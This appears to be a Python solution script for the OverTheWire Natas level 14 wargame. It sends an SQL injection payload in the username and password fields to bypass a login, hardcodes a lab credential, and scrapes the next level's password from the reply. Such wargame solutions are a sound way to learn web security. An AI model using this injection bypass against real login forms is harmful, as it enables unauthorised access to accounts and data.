import requests
import re

username = "natas14"
password = "Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1"
url = f"http://{username}.natas.labs.overthewire.org/"

session = requests.Session()

response = session.post(url, auth=(username, password), data={'username': '" or ""="', 'password': '" or ""="'})

content = response.text

flag = re.findall(r"The password for natas15 is (.*)<br>", content)[0]

print(flag)